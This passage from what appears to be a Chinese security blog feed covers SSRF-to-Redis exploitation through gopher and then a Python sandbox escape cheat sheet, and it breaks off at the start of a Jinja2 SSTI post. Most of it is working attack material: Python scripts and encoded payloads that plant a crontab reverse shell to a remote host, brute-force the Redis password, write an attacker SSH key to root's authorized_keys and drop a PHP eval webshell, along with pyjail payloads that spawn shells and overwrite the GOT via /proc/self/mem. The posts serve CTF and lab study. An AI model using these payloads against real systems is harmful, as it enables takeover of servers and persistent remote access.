class="language-language-http">http://192.168.0.109/ssrf/base/curl_exec.php?url=gopher%3a%2f%2f192.168.0.119%3a6379%2f_%25%30%64%25%30%61%25%30%64%25%30%61%25%37%33%25%36%35%25%37%34%25%32%30%25%36%64%25%36%31%25%37%32%25%37%33%25%32%30%25%32%32%25%35%63%25%36%65%25%35%63%25%36%65%25%35%63%25%36%65%25%35%63%25%36%65%25%32%61%25%32%30%25%32%61%25%32%30%25%32%61%25%32%30%25%32%61%25%32%30%25%32%61%25%32%30%25%37%32%25%36%66%25%36%66%25%37%34%25%32%30%25%36%32%25%36%31%25%37%33%25%36%38%25%32%30%25%32%64%25%36%39%25%32%30%25%33%65%25%32%36%25%32%30%25%32%66%25%36%34%25%36%35%25%37%36%25%32%66%25%37%34%25%36%33%25%37%30%25%32%66%25%33%31%25%33%39%25%33%32%25%32%65%25%33%31%25%33%36%25%33%38%25%32%65%25%33%30%25%32%65%25%33%31%25%33%31%25%33%39%25%32%66%25%33%39%25%33%39%25%33%39%25%33%39%25%32%30%25%33%30%25%33%65%25%32%36%25%33%31%25%35%63%25%36%65%25%35%63%25%36%65%25%35%63%25%36%65%25%35%63%25%36%65%25%32%32%25%30%64%25%30%61%25%36%33%25%36%66%25%36%65%25%36%36%25%36%39%25%36%37%25%32%30%25%37%33%25%36%35%25%37%34%25%32%30%25%36%34%25%36%39%25%37%32%25%32%30%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%30%64%25%30%61%25%36%33%25%36%66%25%36%65%25%36%36%25%36%39%25%36%37%25%32%30%25%37%33%25%36%35%25%37%34%25%32%30%25%36%34%25%36%32%25%36%36%25%36%39%25%36%63%25%36%35%25%36%65%25%36%31%25%36%64%25%36%35%25%32%30%25%36%33%25%37%32%25%36%66%25%36%65%25%37%34%25%36%31%25%36%32%25%30%64%25%30%61%25%37%33%25%36%31%25%37%36%25%36%35%25%30%64%25%30%61<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>简易脚本如下</p><pre class="line-numbers language-language-python"><code class="language-language-python">#!/usr/bin/python# -*- coding: UTF-8 -*-import urllib2,urlliburl = "http://192.168.0.109/ssrf/base/curl_exec.php?url="gopher = "gopher://192.168.0.119:6379/_"# 攻击脚本，\n的\一定要转义"set mars "\\n* * * * * root bash -i >& /dev/tcp/192.168.0.119/6670  0>&1\\n"config set dir /etc/config set dbfilename crontabsave"""def encoder_url(data):    encoder = ""    for single_char in data:        # 先转为ASCII        encoder += str(hex(ord(single_char)))    encoder = encoder.replace("0x","%").replace("%a","%0d%0a")    return encoder# 二次编码encoder = encoder_url(encoder_url(data))# 生存payloadpayload = url + urllib.quote(gopher,'utf-8') + encoder# 发起请求request = urllib2.Request(payload)response = urllib2.urlopen(request).read()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>至于为什么不进行rce，这是由于无回显，如果想要回显的话需要在命令后面加QUIT，后面会用到</p><h6 id="Redis认证攻击"><a href="#Redis认证攻击" class="headerlink" title="Redis认证攻击"></a><strong>Redis认证攻击</strong></h6><p>但是以上为redis无密码的攻击，但如果Redis设置了密码呢？</p><p>说起密码很自然就想起暴力破解或者更改密码，redis的认证命令抓包可以发现是</p><pre class="line-numbers language-language-shell"><code class="language-language-shell">*2$4auth$6Margin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以翻译为认证命令为auth xxxx</p><p>我们自然能更改密码为YUN</p><pre class="line-numbers language-language-shell"><code class="language-language-shell">config set requirepass YUN<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将请求包改为</p><pre class="line-numbers language-language-auth"><code class="language-language-auth">auth Margin quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>python代码变为</p><pre class="line-numbers language-language-python"><code class="language-language-python">#!/usr/bin/python# -*- coding: UTF-8 -*-import urllib2,urlliburl = "http://192.168.0.109/ssrf/base/curl_exec.php?url="gopher = "gopher://192.168.0.119:6379/_"def get_password():    f = open("password.txt","r")    return f.readlines()def encoder_url(data):    encoder = ""    for single_char in data:        # 先转为ASCII        encoder += str(hex(ord(single_char)))    encoder = encoder.replace("0x","%").replace("%a","%0d%0a")    return encoderfor password in get_password():    # 攻击脚本    "auth %s    quit    """ % password    # 二次编码    encoder = encoder_url(encoder_url(data))    # 生存payload    payload = url + urllib.quote(gopher,'utf-8') + encoder    # 发起请求    request = urllib2.Request(payload)    response = urllib2.urlopen(request).read()    if response.count("+OK") > 1:        print "find password : " + password<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以，在已知密码的情况下可以将攻击的python代码中加入认证的语句，如下：</p><pre><code>auth Marginset mars "\\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.0.119/6671  0&gt;&amp;1\\n"config set dir /etc/config set dbfilename crontabsave</code></pre><p>再次运行python脚本，便可成功反弹shell。</p><h6 id="0x03-写ssh-keygen公钥，使用私钥登陆"><a href="#0x03-写ssh-keygen公钥，使用私钥登陆" class="headerlink" title="0x03 写ssh-keygen公钥，使用私钥登陆"></a><strong>0x03 写ssh-keygen公钥，使用私钥登陆</strong></h6><p>在上面的内容中描述了如何使用Redis的数据备份执行命令，接下来讲解通过写入ssh-keygen公钥，使用私钥登录。思路还是利用备份，将私钥字符串备份到目标服务器.ssh目录下。</p><p>要完成此操作，需要两个前提条件</p><p>Redis服务使用ROOT账号启动(可以临时执行sudo -u root /usr/bin/redis-server /etc/redis/redis.conf来以root权限运行</p><p>服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。</p><p>首先在本地生成一对密钥</p><pre class="line-numbers language-language-shell"><code class="language-language-shell">ssh-keygen -t rsamargine:.ssh margin$ ssh-keygen -t rsa<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-language-shell"><code class="language-language-shell">Generating public/private rsa key pair.Enter file in which to save the key (/Users/margin/.ssh/id_rsa):  /Users/margin/.ssh/id_rsa already exists.Overwrite (y/n)? yEnter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /Users/margin/.ssh/id_rsa.Your public key has been saved in /Users/margin/.ssh/id_rsa.pub.The key fingerprint is:SHA256:QKUmi/y9Tu27soIg2+rRrvDO16sQBnrSCzkVx4RcTSw margin@margine.localThe key's randomart image is:+---[RSA 2048]----+| ..=++o..        ||  ooE.o.         ||. . ..+          ||.* . + .         ||* B .   S        ||o*.+ . .         ||o=oo..o .        ||oo=.o.oo         ||o==o.+=++o       |+----[SHA256]-----+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看密钥的字符串，一会使用Redis的备份功能，将密钥字符串传到目标服务器。</p><pre class="line-numbers language-language-shell"><code class="language-language-shell">margine:.ssh margin$ cat id_rsa.pub  ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDgDf+ah2WKGExLdwR/wb8959lZiiV+N0l55PxuwjkclpCAiZSXW8QSMmXPEyRazonnb63cLQHyOnB3u7IPRlqCcKIRnB3qX0GtgjPgDDQlda5pCY99tgtzPQ6qkaiOaxy6k6GQFdSYU5if2m4c/B1DlVSodw7F0sI+v8OG2iGy8UY2n+B049EKpgky45V96xhA9lIFi1tYJiLF7X6tx8l2Jf4OkC8y5am6P1lIG2vg2eraY6iXsCsE8D8Q2nYxdPT5ogKgdyjWULzbRMBjaPgxlgktv12cYjxqbIQhlUKGQxbBxIESf8sY+NMAODAwR4wBDl3thllYsHCzUf5c9yVR margin@margine.local<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>构造payload</p><p>，如下：</p><pre class="line-numbers language-language-shell"><code class="language-language-shell">config set dir /root/.ssh/config set dbfilename authorized_keysset margin "ssh-rsa<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-language-shell"><code class="language-language-shell"> AAAAB3NzaC1yc2EAAAADAQABAAABAQDgDf+ah2WKGExLdwR/wb8959lZiiV+N0l55PxuwjkclpCAiZSXW8QSMmXPEyRazonnb63cLQHyOnB3u7IPRlqCcKIRnB3qX0GtgjPgDDQlda5pCY99tgtzPQ6qkaiOaxy6k6GQFdSYU5if2m4c/B1DlVSodw7F0sI+v8OG2iGy8UY2n+B049EKpgky45V96xhA9lIFi1tYJiLF7X6tx8l2Jf4OkC8y5am6P1lIG2vg2eraY6iXsCsE8D8Q2nYxdPT5ogKgdyjWULzbRMBjaPgxlgktv12cYjxqbIQhlUKGQxbBxIESf8sY+NMAODAwR4wBDl3thllYsHCzUf5c9yVR margin@margine.local"savequit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>进一步得到python代码为：</p><pre class="line-numbers language-language-python"><code class="language-language-python">#!/usr/bin/python# -*- coding: UTF-8 -*-import urllib2,urlliburl = "http://192.168.0.109/ssrf/base/curl_exec.php?url="gopher = "gopher://192.168.0.67:6379/_"# 攻击脚本"config set dir /root/.ssh/config set dbfilename authorized_keysset margin "\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDgDf+ah2WKGExLdwR/wb8959lZiiV+N0l55PxuwjkclpCAiZSXW8QSMmXPEyRazonnb63cLQHyOnB3u7IPRlqCcKIRnB3qX0GtgjPgDDQlda5pCY99tgtzPQ6qkaiOaxy6k6GQFdSYU5if2m4c/B1DlVSodw7F0sI+v8OG2iGy8UY2n+B049EKpgky45V96xhA9lIFi1tYJiLF7X6tx8l2Jf4OkC8y5am6P1lIG2vg2eraY6iXsCsE8D8Q2nYxdPT5ogKgdyjWULzbRMBjaPgxlgktv12cYjxqbIQhlUKGQxbBxIESf8sY+NMAODAwR4wBDl3thllYsHCzUf5c9yVR margin@margine.local\\n\\n"savequit"""def encoder_url(data):    encoder = ""    for single_char in data:        # 先转为ASCII        encoder += str(hex(ord(single_char)))    encoder = encoder.replace("0x","%").replace("%a","%0d%0a")    return encoder# 二次编码encoder = encoder_url(encoder_url(data))print encoder# 生存payloadpayload = url + urllib.quote(gopher,'utf-8') + encoder# 发起请求request = urllib2.Request(payload)response = urllib2.urlopen(request).read()print response<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="0x04-写webshell"><a href="#0x04-写webshell" class="headerlink" title="0x04 写webshell"></a><strong>0x04 写webshell</strong></h6><p>经过上面文章的学习，对于写webshell</p><p>来说便变得非常简单，要完成此操作，需要两个前提条件</p><ul><li>当前运行redis的用户在web目录有写权限</li><li>知道web目录的绝对路径</li></ul><p>步骤比较简单，原理还是利用Redis的备份功能，只不过这次是备份成webshell(redis所在的服务器需要phpstudy环境）</p><p>修改python中的payload，如下：</p><pre><code>"config set dir /var/www/html/config set dbfilename margin.phpset margin "\\n&lt;?php eval($_POST['margin']);?&gt;\\n"savequit"""</code></pre><p>此处不贴完整的python代码了，执行后可以看到目标主机有了margin.php文件，使用蚁剑连接即可。</p>]]></content>
      
      
      <categories>
          
          <category> SSRF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> SSRF漏洞攻击Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python沙箱逃逸</title>
      <link href="/2025/05/09/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
      <url>/2025/05/09/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<p><strong>所谓沙箱逃逸就是绕过模拟的python终端，最终实现命令执行</strong></p><h1 id="Pyjail基础解法，payload构造"><a href="#Pyjail基础解法，payload构造" class="headerlink" title="Pyjail基础解法，payload构造"></a><strong>Pyjail基础解法，payload构造</strong></h1><p>导入模块</p><pre class="line-numbers language-language-python"><code class="language-language-python">os.system() os.popen()commands.getstatusoutput() commands.getoutput()commands.getstatus()subprocess.call(command, shell=True) subprocess.Popen(command, shell=True)pty.spawn()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="基础payload"><a href="#基础payload" class="headerlink" title="基础payload"></a>基础payload</h6><pre class="line-numbers language-language-python"><code class="language-language-python">print(open('/flag').read())__import__('os').system('sh')#读文件().__class__.__bases__[0].__subclasses__()[40]('\etc\password').read()#写文件().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input','w').write('')#执行任意命令().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls /var/www/html").read()')<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="其他的危险函数举例"><a href="#其他的危险函数举例" class="headerlink" title="其他的危险函数举例"></a><strong>其他的危险函数举例</strong></h6><p><strong>execfile</strong> 文件执行 </p><pre class="line-numbers language-language-python"><code class="language-language-python">>>> execfile('/usr/lib/python2.7/os.py')>>> system('cat /etc/passwd')root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologin...>>> getcwd()'/usr/lib/python2.7'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>timeit</strong></p><pre class="line-numbers language-language-python"><code class="language-language-python">import timeittimeit.timeit("__import__('os').system('dir')",number=1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>eval和evec</strong></p><pre class="line-numbers language-language-python"><code class="language-language-python">eval('__import__("os").system("dir")')<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-language-python"><code class="language-language-python">eval(expression[, globals[, locals]])exec(expression[, globals[, locals]])'''用法基本相似，expression执行表达式，globals全局变量(必须字典)，locals局部变量(任意mapping object，一般是字典)不同点：eval将表达式计算出来，结果返回，不会影响当前环境exec将表达式作为py语句运行，可以进行赋值等操作(题目中不常见)eval 与 exec 的区别再于 exec 允许 \n 和 ； 进行换行，而 eval 不允许。并且 exec 不会将结果输出出来，而 eval 会。'''<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使<strong>globals，locals为空字典</strong>访问不到全局变量和局部变量，从而构造沙箱</p><p><strong>ast.literal_eval</strong>更加的安全，因此题目碰到这个基本就不是沙箱逃逸了</p><p>正常的 Python 沙箱会以黑名单的形式禁止使用一些模块如 os 或以白名单的形式只允许用户使用沙箱提供的模块，用以阻止用户的危险操作。而如何进一步逃逸沙箱就是我们的重点研究内容。</p><p>当我们不能导入模块，或者想要导入的模块被禁，那么我们只能寻求 Python 本身内置函数可以通过**dir(<strong>builtins</strong>)**来获取内置函数列表 </p><p>在 Python 中，不引入直接使用的内置函数被成为 <strong>builtin</strong> 函数，随着 <strong>builtin</strong> 这个模块自动引入到环境中</p><p>我们可以通过 <strong>dict</strong> 引入我们想要引入的模块。<strong>dict</strong> 的作用是列出一个模组 / 类 / 对象 下面 所有的属性和函数eg：m.dict[“x”]</p><p>举个 实例</p><pre class="line-numbers language-language-python"><code class="language-language-python">__builtins__.__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base64'))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里的base64编码分别是__import__和os</p><p><em>如果一些 内敛函数在</em> <strong>builtins</strong> <em>删除 ，我们可以通过 reload(<em><strong>builtins</strong></em>) 重新载入获取一个完整的</em> <strong>builtins</strong></p><h6 id="创建对象来引用"><a href="#创建对象来引用" class="headerlink" title="创建对象来引用"></a><strong>创建对象来引用</strong></h6><p>我们有常见的两个方法：</p><pre class="line-numbers language-language-python"><code class="language-language-python">().__class__.__bases__[0]''.__class__.__mro__[2]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>常见 payload</strong></p><pre class="line-numbers language-language-python"><code class="language-language-python">#读文件().__class__.__bases__[0].__subclasses__()[40](r'C:\1.php').read()#写文件().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')#执行任意命令().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls  /var/www/html").read()' )<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="间接引用"><a href="#间接引用" class="headerlink" title="间接引用"></a><strong>间接引用</strong></h6><p>在有些题目中，如2018 年国赛的 Python 沙盒题目上，import 其实整个是被阉割了。但是在 Python 中，原生的 <strong>import</strong> 是存在被引用的，只要我们找到相关对象引用就可以进一步获取我们想要的内容，具体下面的会讲述到</p><p><strong>write 修改 got 表</strong> </p><p>实际上是一个 <strong>/proc/self/mem</strong> 的内存操作方法 <strong>/proc/self/mem</strong> 是内存镜像，能够通过它来读写到进程的所有内存，包括可执行代码，如果我们能获取到 Python 一些函数的偏移，如 <strong>system</strong> ，我们便可以通过覆写 got 表达到 getshell 的目的。 </p><pre class="line-numbers language-language-python"><code class="language-language-python">(lambda r,w:r.seek(0x08de2b8) or w.seek(0x08de8c8) or w.write(r.read(8)) or ().__class__.__bases__[0].__subclasses__()[40]('c'+'at /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb'))(().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem','r'),().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem', 'w', 0))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第一个地址是 system 的偏移，第二个是 fopen 的偏移，我们可以通过 <strong>objdump</strong> 获取相关信息 ，这里并没有搞懂放个例子便于以后理解本质</p><p>eg：</p><p>2018 ciscn 全国大学生信息安全竞赛中的 Python 沙箱逃逸。 我们可以通过</p><p><strong>print ().<strong>class</strong>.<strong>bases</strong>[0].<strong>subclasses</strong>()<a href="%22/home/ctf/sandbox.py%22">40</a>.read()</strong> 获取题目源码，然后可以进一步分析，以下提供三种逃逸方法。</p><p><strong>1.创建对象并利用 Python 操作字符串的特性</strong></p><pre class="line-numbers language-language-python"><code class="language-language-python">x = [x for x in [].__class__.__base__.__subclasses__() if x.__name__ == 'ca'+'tch_warnings'][0].__init__x.__getattribute__("func_global"+"s")['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('l'+'s')x.__getattribute__("func_global"+"s")['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('l'+'s /home/ctf')x.__getattribute__("func_global"+"s")['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ca'+'t /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb')<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>2.劫持 got 表 getshell</strong></p><pre><code>(lambda r,w:r.seek(0x08de2b8) or w.seek(0x08de8c8) or w.write(r.read(8)) or ().__class__.__bases__[0].__subclasses__()[40]('l'+'s /home/ctf/'))(().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem','r'),().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem', 'w', 0))(lambda r,w:r.seek(0x08de2b8) or w.seek(0x08de8c8) or w.write(r.read(8)) or ().__class__.__bases__[0].__subclasses__()[40]('c'+'at /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb'))(().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem','r'),().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem', 'w', 0))</code></pre><p><strong>3.寻找 import 的间接引用</strong> <a href="https://ctf-wiki.org/pwn/sandbox/python/python-sandbox-escape/#import"><strong>¶</strong></a></p><p>在不断的 dir 过程中，发现 <strong>closure</strong> 这个 object 保存了参数，可以引用原生的 <strong>import</strong> </p><pre class="line-numbers language-language-python"><code class="language-language-python">print __import__.__getattribute__('__clo'+'sure__')[0].cell_contents('o'+'s').__getattribute__('sy'+'stem')('l'+'s home') <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="Pyjail绕过方法"><a href="#Pyjail绕过方法" class="headerlink" title="Pyjail绕过方法"></a><strong>Pyjail绕过方法</strong></h1><h2 id="基于长度限制的绕过"><a href="#基于长度限制的绕过" class="headerlink" title="基于长度限制的绕过"></a><strong>基于长度限制的绕过</strong></h2><h2 id="help"><a href="#help" class="headerlink" title="help"></a><strong>help</strong></h2><p>输入help()，这里字符串长度6会进入正常调用eval函数，在help交互式下，输入任意模块名称得该模块的帮助文档，如sys，在Linux中，呈现帮助文档时，实际调用系统的less或more命令，利用这两个命令执行本地命令特性获取shell，继续按#！，执行外部命令sh即可(!ls,!cat flag)</p><h2 id="breakpoint"><a href="#breakpoint" class="headerlink" title="breakpoint()"></a><strong>breakpoint()</strong></h2><p>该函数在程序执行任何位置调用，当程序执行到这个位置时，它将暂停并打开交互式调试器 list input_data = <strong>import</strong>(‘os’).system(‘sh’)</p><h2 id="多次交互进行拼接"><a href="#多次交互进行拼接" class="headerlink" title="多次交互进行拼接"></a><strong>多次交互进行拼接</strong></h2><p>“_”函数字符拼接</p><p>‘00’</p><p>_+’ aaa’</p><p><em>+’ bbb’ eval(</em>)</p><h2 id="基于字符串匹配过滤的绕过"><a href="#基于字符串匹配过滤的绕过" class="headerlink" title="基于字符串匹配过滤的绕过"></a><strong>基于字符串匹配过滤的绕过</strong></h2><p>所有数字被禁用</p><h2 id="函数返回"><a href="#函数返回" class="headerlink" title="函数返回"></a><strong>函数返回</strong></h2><p>0：int(bool([]))，Flase，len([])，any(())</p><p>1：int(bool([“”]))，True，all(())，int(list(dict(aɔ=())).pop()).pop())</p><h2 id="字符串取整"><a href="#字符串取整" class="headerlink" title="字符串取整"></a><strong>字符串取整</strong></h2><p>len(repr(True))，len(repr(bytearray))</p><h2 id="len-dict-list"><a href="#len-dict-list" class="headerlink" title="len+dict+list"></a><strong>len+dict+list</strong></h2><p>0-&gt;len([])</p><p>2-&gt;len(list(dict(aa=()))[len([])])</p><p>3-&gt;len(list(dict(aaa=()))[len([])])</p><h2 id="bytes-type"><a href="#bytes-type" class="headerlink" title="bytes&amp;type"></a><strong>bytes&amp;type</strong></h2><p>bytes = type(str(1).encode())</p><p>以system(“cat flag”)为例： [].<strong>class</strong>.<strong>mro</strong>[-1].<strong>subclasses</strong>()[-4].<strong>init</strong>.<strong>globals</strong>(bytes([115])+bytes([121])+bytes([115])+bytes([116])+bytes([101])+bytes([109])).decode()</p><p>以system(“ls”)为例： [].<strong>class</strong>.<strong>mro</strong>[-1].<strong>subclasses</strong>()[-4].<strong>init</strong>.<strong>globals</strong>(type(str(1).encode())([115])+type(str(1).encode())([121])+type(str(1).encode())([115])+type(str(1).encode())([116])+type(str(1).encode())([101])+type(str(1).encode())([109])).decode()属性名，过滤class，import等</p><h2 id="getattr函数"><a href="#getattr函数" class="headerlink" title="getattr函数"></a><strong>getattr函数</strong></h2><p>获取对象属性和方法,可以代替.</p><p><strong>__getattribute__函数</strong></p><p><strong>__getattr__函数</strong></p><p><strong>__globals__替换</strong></p><p><strong>mro,bases,__base__互换</strong></p><h1 id="基于多行限制的绕过"><a href="#基于多行限制的绕过" class="headerlink" title="基于多行限制的绕过"></a><strong>基于多行限制的绕过</strong></h1><p><strong>exec</strong></p><p>eval(“exec(‘import(“os”)\nprint(1)’)”)</p><h2 id="compile"><a href="#compile" class="headerlink" title="compile"></a><strong>compile</strong></h2><p>eval(‘’’eval(compile(‘print(“hello world”);print(“heyy”)’,’’,’exec’))’’’)</p><h2 id="海象表达式"><a href="#海象表达式" class="headerlink" title="海象表达式"></a><strong>海象表达式</strong></h2><p>eval(‘[a:=<strong>import</strong>(“os”),b:=a.system(“id”)]’)</p><h2 id="基于模块删除绕过"><a href="#基于模块删除绕过" class="headerlink" title="基于模块删除绕过"></a><strong>基于模块删除绕过</strong></h2><p>基于继承链获取</p><p>所有类的基类都是object</p><p>查看变量所属的类(().<strong>class</strong>)</p><p>根据变量的类得到其所属的类(().<strong>class</strong>.<strong>bases</strong>)</p><p>反查object类的子类组成列表(().<strong>class</strong>.<strong>bases</strong>[0].<strong>subclasses</strong>())</p><p>(().<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>())</p><p>获取当前Python环境中所有对象的子类列表</p><p>[].<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()[40]获得第40个子类</p><p>python2与python3差异</p><p>python2中file类可以直接用来读取文件</p><pre class="line-numbers language-language-python"><code class="language-language-python">[].class.bases[0].subclasses()40.read()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>python3中file类已经没有了，用读取文件</p><pre class="line-numbers language-language-python"><code class="language-language-python"><class'_frozen_importlib_external.FileLoader'>读取文件{{().class.bases[0].subclasses()[79]"get_data"}}{{().class.bases[0].subclasses()79.communicate()[0]}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>内建函数eval函数执行命令</p><pre class="line-numbers language-language-python"><code class="language-language-python">{{".class.bases[0].subclasses()[166].init.globals__['builtins']'eval'}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>几个含有eval函数的类：</p><p>warings.catch_warnings</p><p>WaringMessage</p><p>codecs.IncrementalEncoder</p><p>codecs.IncrementalDecoder</p><p>codecs.StreamReaderWriter</p><p>os._wrap_close</p><p>reprlib.Repr</p><p>weakref.finalize</p><h2 id="unicode绕过"><a href="#unicode绕过" class="headerlink" title="unicode绕过"></a><strong>unicode绕过</strong></h2><p>Python3开始支持非ASCII字符的标识符，也就是说，可以使用Unicode字符作为Python变量名，函数名等。python在解析代码时，可以使用Unicode Normalization From KC(NTKC)规范化算法，将一些视觉上相似的Unicode字符统一为一个标准化</p><h2 id="input"><a href="#input" class="headerlink" title="input"></a><strong>input</strong></h2><p>python2中，input函数从标准输入接收输入并自动eval求值，返回所求值；raw_input函数从标准输入接收输入，返回输入字符串</p><p>python3中，input函数从标准输入接收输入返回输入字符串</p><p>python2 input() = python2 eval(raw_input()) = python3 eval(input())</p><p>对于python2的input,相当于存在命令执行，可以rce</p><h2 id="获取全局变量的方法"><a href="#获取全局变量的方法" class="headerlink" title="获取全局变量的方法"></a><strong>获取全局变量的方法</strong></h2><p>函数利用：vars()，globals()</p><p>help()：进入help，查__main__</p>]]></content>
      
      
      <categories>
          
          <category> 沙箱逃逸 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> pyjail </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jinjia2-SSTI请求头回显</title>
      <link href="/2025/04/29/Jinjia2-SSTI%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BE/"/>
      <url>/2025/04/29/Jinjia2-SSTI%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BE/</url>
      
        <content type="html"><![CDATA[<p>主要还是payload对于原理不进行过多描述</p><h1 id="Server回显"><a href="#Server回显" class="headerlink" title="Server回显"></a>Server回显</h1><p>一直听<font style="color:rgb(0, 0, 0);">Mash1r0.师傅讲请求头回显，第五届封神台也是碰到了能请求头回显的ssti，就来学习一下</font></p><p>这个利用方式比较新，据说只要是打jaijia2的ssti应该都能打。</p><p>我们先看看回包的结构：</p><p><img src="/Jinjia2-SSTI%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BE/1745469263731-cc4b17de-49e1-40a5-a15f-80503c522f99.png"><br>注意这里的Serverr，Data回显,对于原出题人的说法是在flask中存在一个Server头：</p><p><img src="/Jinjia2-SSTI%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BE/1745470661475-190d97c2-baac-4dcc-9d22-1d6fda36904b.png"></p><p>然后这个sever头有两个部分server_version和sys_version：</p><p><img src="/Jinjia2-SSTI%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BE/1745470686196-2d1e7446-111d-4606-83f4-dca594425120.png"></p><p>这两个值是WSGIRequestHandler类中的属性，这里可以更改环境中的server_version或者sys_version的值来获取回显。</p><p>中间的代码跟进不再演示</p><p>server_version调用的是WSGIRequestHandler类的server_version()方法：</p><p><img 